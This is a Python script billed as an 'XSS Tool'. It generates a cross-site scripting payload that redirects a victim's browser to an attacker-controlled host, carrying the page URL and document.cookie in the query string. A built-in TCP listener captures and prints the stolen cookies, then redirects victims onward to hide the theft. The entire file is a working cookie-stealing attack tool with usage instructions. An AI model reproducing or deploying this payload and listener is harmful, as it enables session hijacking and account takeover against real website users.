#!/usr/bin/python3
# @Martin 
import socket
import sys
import argparse
import datetime
import textwrap
import threading
import re


def Get_LoackHost():
    return socket.gethostbyname(socket.gethostname())


class TCPINFO():
    def __init__(self, args):
        self.args = args
        self.LPORT = args.LPORT
        self.LHOST = args.LHOST
        self.RPORTS = args.RPORTS
        self.RHOSTS = args.RHOSTS
        self.transmission_mode=args.transmission_mode
    def run(self):
        if self.transmission_mode:
            PAYLOAD = f"<script>document.write('<meta http-equiv=\"refresh\" content=\"0;url=http://{self.RHOSTS}:{str(self.RPORTS)}/1.html?URL='+window.location.href+'&cookie='+document.cookie+'\"');</script>"
        else:
            PAYLOAD = f"<script>document.write('<meta http-equiv=\"refresh\" content=\"0;url=http://{self.LHOST}:{str(self.LPORT)}/1.html?URL='+window.location.href+'&cookie='+document.cookie+'\"');</script>"
        self.Redirect_File()
        print('-'*100,"\n---|Payload[+]# PAYLOAD generated\n   |->",PAYLOAD,"\n",'-'*100)
        self.TCP_Listen()


    def TCP_Listen(self):
        TCP = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        TCP.bind(("", self.LPORT))
        TCP.listen(50)
        while True:
            SOCK, IP = TCP.accept()
            threading.Thread(
                target=self.Client, args=(SOCK,IP)
            ).start()



    def Client(self,SOCK,IP):
        print("[+]", IP[0] + ":" + str(IP[1]), "-----[Connect]",datetime.datetime.now())
        DATA = SOCK.recv(1024)
        self.Get_Cookie(DATA)
        self.Send_Redirect_file(SOCK)
        SOCK.close()


    def Redirect_File(self):
        with open("./1.html","w")as F:
            F.write("<meta http-equiv=\"refresh\" content=\"0;url=http://www.baidu.com\">")
        print("[+]Redirect module ready")


    def Send_Redirect_file(self,SOCK):
        with open("./1.html", "rb") as F:
            File_DATA = F.read()
        message = "HTTP/1.1 200 OK\r\n"
        message += f"content-length:{len(File_DATA)}\r\n\r\n"
        SOCK.send(message.encode())
        SOCK.send(File_DATA)


    def Get_Cookie(self,DATA):
        DATA = DATA.decode().split("\r")[0]
        try:
            Path = re.search(r'URL=(?P<PATH>.*?)&cookie', DATA).group("PATH")
        except:
            pass
        else:
            print("Path:",Path)
        try:
            Cookie=re.search(r'cookie=(?P<COOKIE>.*?) HTTP',DATA).group("COOKIE")
        except:
            pass
        else:
            print("Cookie:",Cookie)



def main():
    parser = argparse.ArgumentParser(
        description='XSS Tool ---Martin v1.2',
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=textwrap.dedent('''
        Example:
            author-Github==>https://github.com/MartinxMax
        Usage:
           python3 %s # You can enable the default intranet port 5555 to listen without adding any parameters
           python3 %s -lp 1234  # You can add the - p parameter to specify the port
           python3 %s -t -lp 1234 -rh xxx.xxx.xxx.xxx -rp xxxx # You can join the IP and port penetrated by your intranet
            '''% (sys.argv[0],sys.argv[0],sys.argv[0])))  
    parser.add_argument('-lp', '--LPORT', type=int, default=5555, help='Listen port')
    parser.add_argument('-lh', '--LHOST', default=Get_LoackHost(), help='# Currently in the development stage, you don\'t need to carry this parameter')
    parser.add_argument('-t', '--transmission_mode', action='store_true', help='Intranet penetration mode')
    parser.add_argument('-rp', '--RPORTS', type=int, default=5555, help='Remote Port')
    parser.add_argument('-rh', '--RHOSTS', default=Get_LoackHost(), help='Remote IP')
    args = parser.parse_args()
    TCPINFO(args).run()


if __name__ == '__main__':
    main()